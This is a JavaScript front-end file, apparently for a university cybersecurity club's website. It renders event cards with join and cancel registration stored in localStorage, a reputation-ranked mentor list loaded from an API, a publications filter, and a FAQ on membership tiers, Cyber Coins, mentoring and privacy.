    capacity: 30
  },
  {
    id: 'evt-003', type: 'CTF', typeColor: '#c084fc',
    title: 'VN-CTF 2026 — National Competition',
    date: '20.APR.2026', time: '09:00 — 21:00',
    location: 'Online',
    description: 'National Capture The Flag competition. Categories: Web, Pwn, Crypto, Forensics, Reversing. Top 3 teams earn double Cyber Coins and verified achievement badges.',
    capacity: 0
  },
  {
    id: 'evt-004', type: 'WORKSHOP', typeColor: '#60a5fa',
    title: 'Spring Boot Masterclass',
    date: '08.APR.2026', time: '09:00 — 12:00',
    location: 'Room C101, IU Campus',
    description: 'Deep dive into Spring Boot 3.x: building REST APIs, Spring Security, and JPA. Prerequisites: basic Java knowledge. Limited seats — register early.',
    capacity: 25
  },
  {
    id: 'evt-005', type: 'SEMINAR', typeColor: '#8eff71',
    title: 'Cybersecurity Career Paths in 2026',
    date: '15.APR.2026', time: '15:00 — 17:00',
    location: 'Auditorium, IU Campus',
    description: 'Industry professionals share insights on penetration testing, security engineering, threat intelligence, and GRC. Open Q&A session included.',
    capacity: 100
  }
];

function _getJoinedEvents() {
  try { return JSON.parse(localStorage.getItem('joined_events') || '[]'); } catch { return []; }
}

function joinEvent(eventId) {
  const savedUserStr = sessionStorage.getItem('cyber_user') || localStorage.getItem('cyber_user');
  if (!savedUserStr) { showToast('Please log in to join events.', 'error'); openModal('login-modal'); return; }
  const joined = _getJoinedEvents();
  if (joined.includes(eventId)) { showToast('Already registered for this event.', 'error'); return; }
  joined.push(eventId);
  localStorage.setItem('joined_events', JSON.stringify(joined));
  showToast('Successfully joined! See you there.', 'success');
  _renderEvents();
}

function leaveEvent(eventId) {
  const joined = _getJoinedEvents().filter(id => id !== eventId);
  localStorage.setItem('joined_events', JSON.stringify(joined));
  showToast('Event registration cancelled.', 'success');
  _renderEvents();
}

function _renderEvents(filterType) {
  const container = document.getElementById('events-grid');
  if (!container) return;
  const joined = _getJoinedEvents();
  const items = (filterType && filterType !== 'ALL') ? EVENTS.filter(e => e.type === filterType) : EVENTS;
  if (!items.length) {
    container.innerHTML = `<div class="col-span-3 text-center py-20 font-mono text-gray-500 text-xs uppercase tracking-widest">[ No events found ]</div>`;
    return;
  }
  container.innerHTML = items.map(e => {
    const isJoined = joined.includes(e.id);
    const capacityText = e.capacity === 0 ? 'Unlimited' : e.capacity;
    return `
      <div class="group bg-[#0a0a0a] border ${isJoined ? 'border-primary/30' : 'border-white/10'} p-6 relative overflow-hidden hover:border-primary/50 transition-all duration-300 flex flex-col">
        <div class="absolute top-0 left-[-100%] w-full h-[2px] bg-primary group-hover:left-0 transition-all duration-500" style="background:${e.typeColor}"></div>
        <div class="flex justify-between items-center mb-4">
          <span class="font-mono text-[10px] uppercase tracking-widest px-2 py-0.5 border"
                style="color:${e.typeColor};border-color:${e.typeColor}44;background:${e.typeColor}11">${e.type}</span>
          ${isJoined ? '<span class="font-mono text-[9px] text-primary uppercase tracking-widest animate-pulse">● JOINED</span>' : ''}
        </div>
        <h3 class="text-white text-xl font-bold leading-tight mb-3 group-hover:text-primary transition-colors font-headline">${e.title}</h3>
        <p class="text-gray-400 text-sm mb-5 leading-relaxed flex-1 font-mono">${e.description}</p>
        <div class="border-t border-white/5 pt-4 space-y-2 mb-5">
          <div class="flex items-center gap-2 font-mono text-xs text-gray-500">
            <span class="material-symbols-outlined text-[14px]" style="color:${e.typeColor}">calendar_month</span>
            ${e.date} · ${e.time}
          </div>
          <div class="flex items-center gap-2 font-mono text-xs text-gray-500">
            <span class="material-symbols-outlined text-[14px]" style="color:${e.typeColor}">location_on</span>
            ${e.location}
          </div>
          <div class="flex items-center gap-2 font-mono text-xs text-gray-500">
            <span class="material-symbols-outlined text-[14px]" style="color:${e.typeColor}">group</span>
            Capacity: ${capacityText}
          </div>
        </div>
        ${isJoined
          ? `<button onclick="leaveEvent('${e.id}')" class="w-full py-3 bg-red-600/20 border border-red-500/50 text-red-400 font-mono text-[10px] uppercase tracking-widest hover:bg-red-600 hover:text-white transition-all">CANCEL REGISTRATION</button>`
          : `<button onclick="joinEvent('${e.id}')" class="w-full py-3 border font-mono text-[10px] uppercase tracking-widest transition-all hover:text-black" style="border-color:${e.typeColor};color:${e.typeColor}" onmouseover="this.style.background='${e.typeColor}'" onmouseout="this.style.background=''">JOIN EVENT</button>`
        }
      </div>`;
  }).join('');
}

function filterEvents(type, btn) {
  document.querySelectorAll('#events-filter-bar button').forEach(b => {
    b.classList.remove('text-primary', 'border-primary');
    b.classList.add('text-gray-500', 'border-transparent');
  });
  btn.classList.remove('text-gray-500', 'border-transparent');
  btn.classList.add('text-primary', 'border-primary');
  _renderEvents(type);
}

function buildEvents() {
  _renderEvents();
}

let _mentorCache = null;

async function buildMentorList(skillFilter) {
    const container = document.getElementById('mentor-list-container');
    if (!container) return;

    try {
        if (!_mentorCache) {
            const [membersRes, rankRes] = await Promise.all([
                fetch(`${API_BASE_URL}/team/members`),
                fetch(`${API_BASE_URL}/ranking`).catch(() => null)
            ]);
            if (!membersRes.ok) throw new Error();
            const members = await membersRes.json();
            const ranking = (rankRes && rankRes.ok) ? await rankRes.json() : [];

            // Merge reputation score from ranking, then sort highest first
            _mentorCache = members.map(m => {
                const rankEntry = ranking.find(r => r.name === m.name);
                return { ...m, reputationScore: rankEntry ? (rankEntry.point || 0) : 0 };
            }).sort((a, b) => b.reputationScore - a.reputationScore);
        }

        const members = (skillFilter && skillFilter !== 'ALL')
            ? _mentorCache.filter(m =>
                (m.experiences || []).some(e =>
                    (e.name || '').toLowerCase().includes(skillFilter.toLowerCase())
                )
              )
            : _mentorCache;

        if (!members.length) {
            container.innerHTML = `<div class="col-span-3 text-center py-10 font-mono text-gray-500 text-xs uppercase tracking-widest">No mentors found for "${skillFilter}"</div>`;
            return;
        }

        const _mi = name => (name || '?').split(' ').map(w => w[0]).join('').slice(0, 2).toUpperCase();
        const _mbg = name => ['#1a3a2a','#1e3a5f','#3d1a42','#3d2b00','#1a2e3a','#2d1a1a'][(name||'').charCodeAt(0) % 6];
        const _mentorAvatar = m => m.avatar
            ? `<img src="${m.avatar}" class="w-12 h-12 object-cover border border-white/10 grayscale hover:grayscale-0 transition-all flex-shrink-0" onerror="this.style.display='none';this.nextElementSibling.style.display='flex'"/><div class="w-12 h-12 flex items-center justify-center font-headline font-bold text-sm text-primary border border-primary/30 flex-shrink-0" style="display:none;background:${_mbg(m.name)}">${_mi(m.name)}</div>`
            : `<div class="w-12 h-12 flex items-center justify-center font-headline font-bold text-sm text-primary border border-primary/30 flex-shrink-0" style="background:${_mbg(m.name)}">${_mi(m.name)}</div>`;
        container.innerHTML = members.map((m, i) => {
            const skills = (m.experiences || []).slice(0, 4).map(e =>
                `<span class="tag-secondary pf-skill-tag">${e.name || ''}</span>`
            ).join('');
            const repColor = i === 0 ? 'text-[#fbbf24]' : i === 1 ? 'text-[#e5e7eb]' : i === 2 ? 'text-[#f97316]' : 'text-primary';
            const repLabel = i === 0 ? '🥇' : i === 1 ? '🥈' : i === 2 ? '🥉' : `#${i + 1}`;
            return `
                <div class="hack-card p-6 card-lift flex flex-col">
                    <div class="scanner"></div>
                    <div class="flex items-start justify-between mb-4">
                        <div class="flex items-center gap-3">
                            ${_mentorAvatar(m)}
                            <div>
                                <h4 class="font-headline font-bold text-white">${m.name}</h4>
                                <p class="font-mono text-[10px] text-primary uppercase tracking-widest">${m.role}</p>
                            </div>
                        </div>
                        <div class="text-right flex-shrink-0 ml-2">
                            <p class="font-mono text-[10px] text-gray-500 uppercase">REP</p>
                            <p class="font-headline font-bold ${repColor}">${m.reputationScore.toLocaleString()}</p>
                            <p class="font-mono text-[10px] text-gray-500">${repLabel}</p>
                        </div>
                    </div>
                    <div class="flex flex-wrap gap-1.5 mb-4 flex-1">${skills || '<span class="tag-secondary pf-skill-tag">General</span>'}</div>
                    <button onclick="openProfileModal(${m.id})" class="w-full text-primary font-mono text-[10px] uppercase border border-primary/20 px-4 py-2 hover:bg-primary hover:text-black transition-all mt-auto">
                        View Profile &amp; Request
                    </button>
                </div>`;
        }).join('');
    } catch (err) {
        container.innerHTML = `<div class="col-span-3 text-center py-10 font-mono text-gray-500 text-xs uppercase tracking-widest">[ Failed to load mentors ]</div>`;
    }
}

function filterMentorSkill(skill, btn) {
    document.querySelectorAll('#mentor-filter-bar button').forEach(b => {
        b.className = 'tag-secondary pf-skill-tag';
    });
    btn.className = 'tag-gold pf-skill-tag';
    buildMentorList(skill);
}

function filterPublications(category, btn) {
    document.querySelectorAll('#pub-filter-bar button').forEach(b => {
        b.classList.remove('text-primary', 'border-primary');
        b.classList.add('text-gray-500', 'border-transparent');
    });
    btn.classList.remove('text-gray-500', 'border-transparent');
    btn.classList.add('text-primary', 'border-primary');

    document.querySelectorAll('#publications-grid [data-category]').forEach(card => {
        const show = category === 'ALL' || card.dataset.category === category;
        card.style.display = show ? '' : 'none';
    });
}

function buildFaqAndPolicies() {
    const container = document.getElementById('faq-container');
    if (!container) return;

    const items = [
        {
            category: 'MEMBERSHIP',
            q: 'Who can join CyberTitans?',
            a: 'Any student at International University (IU) can join. Simply create an account, complete your profile, and you are automatically enrolled as a Recruit. No technical prerequisites are required — all skill levels are welcome.'
        },
        {
            category: 'MEMBERSHIP',
            q: 'What is the difference between Recruit, Operative, and Master tiers?',
            a: 'Recruit (free) gives basic access to public content and the community. Operative (1,000 Coins) unlocks private repositories, CTF labs, and mentorship sessions. Master (5,000 Coins) grants full access including unlimited 1-on-1 mentorship and gold advisory access. Tier upgrades are paid with Cyber Coins earned through contributions.'
        },
        {
            category: 'CYBER COINS',
            q: 'How do I earn Cyber Coins?',
            a: 'Coins are awarded for verified contributions: completing project tasks, attending workshops, winning CTF competitions, submitting publications, and receiving positive mentor reviews. The exact amount depends on the activity type and is recorded automatically by the system.'
        },
        {
            category: 'CYBER COINS',
            q: 'What can I spend Cyber Coins on?',
            a: 'Coins can be used to request a 1-on-1 mentorship session (500 Coins per session) or to unlock higher membership tiers (Operative: 1,000 / Master: 5,000). Coins cannot be transferred between members.'
        },
        {
            category: 'MENTOR MATCHING',
            q: 'How does the Mentor Matching system work?',
            a: 'Mentors are ranked by reputation score — a StackOverflow-inspired metric calculated from successful mentorship sessions, community upvotes, and project guidance outcomes. When you request a mentor, the system matches you based on skill compatibility (e.g., a Java learner is paired with a Java expert). The mentor with the highest reputation score among compatible mentors is recommended first.'
        },
        {
            category: 'MENTOR MATCHING',
            q: 'How do I become a mentor?',
            a: 'Members with the MENTOR role can offer mentorship sessions. Mentor status is assigned by admins based on demonstrated technical expertise, contribution history, and reputation score. Contact the club admin if you believe you qualify.'
        },
        {
            category: 'PORTFOLIO & CV',
            q: 'What is the Verified Portfolio / Proof of Work?',
            a: 'Your portfolio is auto-generated from real system data — projects you contributed to, workshops you attended, and skills validated by the club. Unlike self-reported CVs, every item is backed by recorded evidence, making your portfolio a trustworthy "Proof of Work" that recruiters can verify.'
        },
        {
            category: 'PORTFOLIO & CV',
            q: 'How do I export my CV?',
            a: 'Navigate to your Profile page and click "MY PORTFOLIO", then click "GENERATE CV.EXE". A print-ready version of your verified portfolio will open in a new tab. Use your browser\'s "Print to PDF" function (Ctrl+P / Cmd+P) to save it as a PDF file.'
        },
        {
            category: 'PROJECTS',
            q: 'How do I join a club project?',
            a: 'Browse active projects on the Projects page and click "View Analytics" to see open roles. Contact the project lead directly, or use the Project Incubator page to pitch your own idea. All project contributions are tracked and added to your portfolio automatically.'
        },
        {
            category: 'PROJECTS',
            q: 'How is project contribution tracked?',
            a: 'The system records tasks completed, collaboration roles, and participation levels for each member per project. These metrics are displayed in the Project Contribution Analytics panel and are used to calculate your reputation score and populate your verified portfolio.'
        },
        {
            category: 'PRIVACY & DATA',
            q: 'Who can see my profile information?',
            a: 'Your name, role, and public skills are visible to all club members. Your email and phone number are only visible to you and admins. Your portfolio page is visible to all logged-in members. Admins can access full member data for club management purposes.'
        },
        {
            category: 'PRIVACY & DATA',
            q: 'How do I delete my account?',
            a: 'Account deletion must be requested through a club admin. Your contribution history and project records are retained for club records but your personal information (email, phone) will be removed. Contact an admin via the Team page.'
        }
    ];

    // Group by category
    const categories = [...new Set(items.map(i => i.category))];
    container.innerHTML = categories.map(cat => {
        const catItems = items.filter(i => i.category === cat);
        const idx_offset = items.indexOf(catItems[0]);
        return `
            <div class="mb-8">
                <div class="flex items-center gap-2 mb-4">
                    <div class="w-2 h-2 bg-secondary"></div>
                    <span class="font-mono text-[10px] uppercase tracking-[0.2em] text-secondary">${cat}</span>
                </div>
                <div class="space-y-2">
                    ${catItems.map((item, i) => {
                        const idx = idx_offset + i;
                        return `
                        <div class="border border-white/5 bg-[#0a0a0a] hover:border-secondary/20 transition-all">
                            <button onclick="toggleFaq(${idx})" class="w-full flex items-center justify-between px-6 py-4 text-left group">
                                <span class="font-bold text-sm text-white group-hover:text-secondary transition-colors pr-4">${item.q}</span>
                                <span id="faq-icon-${idx}" class="text-secondary font-mono text-xl flex-shrink-0">+</span>
                            </button>
                            <div id="faq-answer-${idx}" class="hidden px-6 pb-4">
                                <p class="text-on-surface-variant text-sm leading-relaxed font-mono">${item.a}</p>
                            </div>
                        </div>`;
                    }).join('')}
                </div>
            </div>`;
    }).join('');
}

function toggleFaq(index) {
    const ans = document.getElementById(`faq-answer-${index}`);
    const icon = document.getElementById(`faq-icon-${index}`);
    ans.classList.toggle('hidden');
    icon.textContent = ans.classList.contains('hidden') ? '+' : '-';
}